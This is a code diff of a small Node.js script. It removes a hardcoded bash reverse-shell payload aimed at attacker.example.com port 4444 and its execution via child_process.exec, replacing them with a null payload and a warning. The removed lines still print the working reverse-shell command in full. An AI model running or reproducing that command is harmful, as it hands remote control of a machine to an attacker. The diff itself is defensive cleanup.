@@ -1,12 +1,8 @@
 const { exec } = require('child_process');
 
-const payload = 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1';
+// Removed hardcoded reverse shell payload to prevent remote code execution.
+const payload = null;
 
-console.log('[*] Executing reverse shell payload…');
-exec(payload, (err, stdout, stderr) => {
-  if (err) {
-    console.error('[!] Error executing payload:', err);
-    return;
-  }
-  console.log('[+] Payload executed. stdout:', stdout);
-});
+console.warn('[!] Dangerous payload detected and removed. Execution skipped.');
+// Execution of untrusted shell commands is intentionally disabled.
+// If this behavior is needed, use a secure, configurable approach and validate inputs.
